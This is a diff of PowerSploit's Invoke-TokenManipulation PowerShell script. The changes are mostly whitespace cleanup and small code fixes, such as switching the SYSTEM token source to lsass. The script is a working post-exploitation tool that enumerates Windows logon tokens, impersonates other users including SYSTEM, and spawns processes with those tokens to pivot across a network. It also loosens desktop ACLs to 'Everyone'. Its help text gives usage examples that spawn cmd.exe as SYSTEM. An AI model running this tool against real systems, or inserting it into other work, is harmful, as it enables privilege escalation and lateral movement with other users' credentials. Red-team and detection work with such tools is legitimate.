@@ -1,49 +1,36 @@
-function Invoke-TokenManipulation
-{
+function Invoke-TokenManipulation{
 <#
 .SYNOPSIS
-
 This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
 anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
 This functionality is very similar to the incognito tool (with some differences, and different use goals).
-
 This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
 creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
 that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
 to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).
-
-Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
+Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon
 Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
 credentials for the authentication.
-
-IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". 
+IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone".
 This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
 is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
 so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
 This could show up in logs depending on the level of monitoring.
-
-
 PERMISSIONS REQUIRED:
 SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
 SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.
-
-
 Important differences from incognito:
 First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
 between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
 which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
 you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
-without dumping credentials. 
-
+without dumping credentials.
 In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
-matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
+matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for
 the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
 should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
 for tokens which were created with desirable logon tokens (and only displays them by default).
-
 In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).
-
-
 PowerSploit Function: Invoke-TokenManipulation
 Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
@@ -51,133 +38,75 @@ Required Dependencies: None
 Optional Dependencies: None
 Version: 1.11
 (1.1 -> 1.11: PassThru of System.Diagnostics.Process object added by Rune Mariboe, https://www.linkedin.com/in/runemariboe)
-
 .DESCRIPTION
-
 Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.
-
 .PARAMETER Enumerate
-
 Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).
-
 .PARAMETER RevToSelf
-
 Switch. Stops impersonating an alternate users Token.
-
 .PARAMETER ShowAll
-
 Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).
-
 .PARAMETER ImpersonateUser
-
 Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
     This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
-    
+
 .PARAMETER CreateProcess
-
 Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
-    
+
 .PARAMETER WhoAmI
-
 Switch. Displays the credentials the PowerShell thread is running under.
-
 .PARAMETER Username
-
 Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.
-
 .PARAMETER ProcessId
-
 Specify the Token to use by ProcessId. This will use the primary token of the process specified.
-
 .PARAMETER Process
-
 Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.
-
 .PARAMETER ThreadId
-
 Specify the Token to use by ThreadId. This will use the token of the thread specified.
-
 .PARAMETER ProcessArgs
-
 Specify the arguments to start the specified process with when using the -CreateProcess mode.
-
 .PARAMETER NoUI
-
-If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the 
+If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the
 current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
 to "Everyone".
-
 .PARAMETER PassThru
-
 If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.
 
-    
 .EXAMPLE
-
 Invoke-TokenManipulation -Enumerate
-
 Lists all unique usable tokens on the computer.
-
 .EXAMPLE
-
 Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"
-
 Spawns cmd.exe as SYSTEM.
-
 .EXAMPLE
-
 Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"
-
 Makes the current PowerShell thread impersonate SYSTEM.
-
 .EXAMPLE
-
 Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500
-
 Spawns cmd.exe using the primary token belonging to process ID 500.
-
 .EXAMPLE
-
 Invoke-TokenManipulation -ShowAll
-
 Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.
-
 .EXAMPLE
-
 Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500
-
 Spawns cmd.exe using the token belonging to thread ID 500.
-
 .EXAMPLE
-
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"
-
 Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.
-
 .EXAMPLE
-
 (Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()
-
 Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.
-
 .EXAMPLE
-
 Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser
-
 Makes the current thread impersonate the lsass security token.
-
 .NOTES
-This script was inspired by incognito. 
-
+This script was inspired by incognito.
 Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
 BIG THANKS to Matt Graeber for helping debug.
-
 .LINK
-
 Blog: http://clymb3r.wordpress.com/
 Github repo: https://github.com/clymb3r/PowerShell
 Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
-
 #>
 
     [CmdletBinding(DefaultParameterSetName="Enumerate")]
@@ -237,7 +166,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         [Switch]
         $PassThru
     )
-   
+
     Set-StrictMode -Version 2
 
     #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
@@ -246,11 +175,11 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -265,7 +194,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -276,11 +205,11 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -520,7 +449,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
     $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
     $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
-        
+
     #Struct TOKEN_PRIVILEGES
     $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
     $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
@@ -584,15 +513,15 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
     $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
     $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
-    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    
+    $OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)
 
     $GetTokenInformationAddr = Get-ProcAddress advapi32.dll GetTokenInformation
     $GetTokenInformationDelegate = Get-DelegateType @([IntPtr], $TOKEN_INFORMATION_CLASS, [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)    
+    $GetTokenInformation = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetTokenInformationAddr, $GetTokenInformationDelegate)
 
     $SetThreadTokenAddr = Get-ProcAddress advapi32.dll SetThreadToken
     $SetThreadTokenDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([Bool])
-    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)    
+    $SetThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetThreadTokenAddr, $SetThreadTokenDelegate)
 
     $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
     $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
@@ -704,61 +633,15 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     ###############################
 
 
-    #Used to add 64bit memory addresses
-    Function Add-SignedIntAsUnsigned
-    {
-        Param(
-        [Parameter(Position = 0, Mandatory = $true)]
-        [Int64]
-        $Value1,
-        
-        [Parameter(Position = 1, Mandatory = $true)]
-        [Int64]
-        $Value2
-        )
-        
-        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
-        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
-        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
-
-        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
-        {
-            $CarryOver = 0
-            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
-            {
-                #Add bytes
-                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
-
-                $FinalBytes[$i] = $Sum -band 0x00FF
-                
-                if (($Sum -band 0xFF00) -eq 0x100)
-                {
-                    $CarryOver = 1
-                }
-                else
-                {
-                    $CarryOver = 0
-                }
-            }
-        }
-        else
-        {
-            Throw "Cannot add bytearrays of different sizes"
-        }
-        
-        return [BitConverter]::ToInt64($FinalBytes, 0)
-    }
-
-
     #Enable SeAssignPrimaryTokenPrivilege, needed to query security information for desktop DACL
     function Enable-SeAssignPrimaryTokenPrivilege
-    {   
+    {
         [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
         if ($ThreadHandle -eq [IntPtr]::Zero)
         {
             Throw "Unable to get the handle to the current thread"
         }
-        
+
         [IntPtr]$ThreadToken = [IntPtr]::Zero
         [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
         $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -772,7 +655,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 {
                     Throw (New-Object ComponentModel.Win32Exception)
                 }
-                
+
                 $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                 if ($Result -eq $false)
                 {
@@ -786,7 +669,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         }
 
         $CloseHandle.Invoke($ThreadHandle) | Out-Null
-    
+
         $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
         $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
         $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
@@ -842,13 +725,12 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             [String]
             $Privilege
         )
-
         [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
         if ($ThreadHandle -eq [IntPtr]::Zero)
         {
             Throw "Unable to get the handle to the current thread"
         }
-        
+
         [IntPtr]$ThreadToken = [IntPtr]::Zero
         [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
         $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -862,7 +744,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 {
                     Throw (New-Object ComponentModel.Win32Exception)
                 }
-                
+
                 $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                 if ($Result -eq $false)
                 {
@@ -876,7 +758,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         }
 
         $CloseHandle.Invoke($ThreadHandle) | Out-Null
-    
+
         $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
         $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
         $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
@@ -922,7 +804,6 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
     function Set-DesktopACLs
     {
         Enable-Privilege -Privilege SeSecurityPrivilege
-
         #Change the privilege for the current window station to allow full privilege for all users
         $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
         $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)
@@ -1046,7 +927,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         }
         else
         {
-            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
+            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY
         }
 
         $ReturnStruct = New-Object PSObject
@@ -1179,7 +1060,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             else
             {
                 $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
-                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
+                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and
                     $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                 {
                     #Get the username and domainname associated with the token
@@ -1187,7 +1068,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                     $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)
 
                     #If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)
-                    #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account 
+                    #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account
                     #results in querying the domain controller which is unwanted.
                     if ($Username -ieq "$($env:COMPUTERNAME)`$")
                     {
@@ -1218,7 +1099,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
                     $ReturnObj = New-Object PSObject
                     $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
-                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
+                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username
                     $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                     $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType
 
@@ -1233,7 +1114,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                     if (-not $Success)
                     {
                         $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
+                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode"
                     }
                     else
                     {
@@ -1335,18 +1216,18 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                     else
                     {
                         $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
-                        
+
                         #Loop through each privilege
-                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
+                        [IntPtr]$PrivilegesBasePtr = [IntPtr]::add($TokenPrivilegesPtr, ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
                         $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                         for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                         {
-                            $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))
+                            $LuidAndAttributePtr = [IntPtr]::add($PrivilegesBasePtr, ($LuidAndAttributeSize * $i))
 
                             $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)
 
                             #Lookup privilege name
-                            [UInt32]$PrivilegeNameSize = 60
+                            [UInt32]$PrivilegeNameSize = 100
                             $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
                             $PLuid = $LuidAndAttributePtr #The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid
 
@@ -1595,13 +1476,13 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
             {
                 $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
             }
-            
+
             $FunctionName = ""
             if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
             {
                 #Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because
                 #this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege
-                #which is not ideal. 
+                #which is not ideal.
                 Write-Verbose "Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."
                 Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
                 $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
@@ -1686,7 +1567,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
 
         #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
         #Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges, so impersonate the wininit token.
-        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
+        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process lsass | where {$_.SessionId -eq 0}).Id
         if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
         {
             Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
@@ -1701,8 +1582,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}
 
         #Get all tokens
-        foreach ($Process in $ProcessIds)
-        {
+         foreach($Process in $ProcessIds){
             $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)
 
             #If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.
@@ -1737,7 +1617,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                         if ($ReturnObj -ne $null)
                         {
                             $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
-                    
+
                             $AllTokens += $ReturnObj
                         }
                     }
@@ -1797,7 +1677,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
         {
             $AllTokens = Enum-AllTokens
-            
+
             #Select the token to use
             [IntPtr]$hToken = [IntPtr]::Zero
             $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
@@ -1873,7 +1753,6 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
                 {
                     Set-DesktopACLs
                 }
-
                 Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru
 
                 Invoke-RevertToSelf
@@ -1909,7 +1788,7 @@ Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-toke
         }
     }
 
-
     #Start the main function
     Main
 }
+
